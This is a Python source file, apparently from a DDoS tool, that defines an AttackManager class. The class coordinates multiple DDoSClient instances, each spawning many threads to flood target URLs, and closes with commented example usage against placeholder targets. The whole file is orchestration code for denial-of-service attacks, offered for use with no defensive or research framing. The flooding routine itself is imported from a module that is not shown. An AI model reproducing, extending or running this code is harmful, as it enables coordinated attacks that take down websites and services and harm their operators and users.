"""
Attack manager for coordinating multiple DDoS clients
"""

import time
import threading
from ddos_tool.core.ddos_client import DDoSClient


class AttackManager:
    """Manages multiple DDoS clients for coordinated attacks"""

    def __init__(self):
        self.clients = []
        self.attack_running = False
        self.attack_stats = {
            'total_requests': 0,
            'active_clients': 0
        }

    def add_client(self, target, threads):
        """Add a new DDoS client to the attack"""
        client = DDoSClient(target, threads)
        self.clients.append(client)
        return len(self.clients) - 1

    def remove_client(self, client_id):
        """Remove a client from the attack"""
        if 0 <= client_id < len(self.clients):
            del self.clients[client_id]
            return True
        return False

    def start_coordinated_attack(self):
        """Start all clients in a coordinated attack"""
        if not self.clients:
            print("[!] No clients configured for attack")
            return

        self.attack_running = True
        print(f"[+] Starting coordinated attack with {len(self.clients)} clients")

        threads = []
        for i, client in enumerate(self.clients):
            client.attack_running = True
            for j in range(client.num_threads):
                thread = threading.Thread(target=client.attack_thread)
                thread.daemon = True
                thread.start()
                threads.append(thread)
            print(f"[+] Client {i + 1} started with {client.num_threads} threads")

        try:
            while self.attack_running:
                time.sleep(1)
        except KeyboardInterrupt:
            self.stop_attack()

    def stop_attack(self):
        """Stop all running attacks"""
        print("\n[!] Stopping all attacks...")
        self.attack_running = False

        for client in self.clients:
            client.attack_running = False

        time.sleep(2)
        print("[+] All attacks stopped")

# Example usage:
# manager = AttackManager()
# manager.add_client("http://target1.com", 10)
# manager.add_client("http://target2.com", 5)
# manager.start_coordinated_attack()
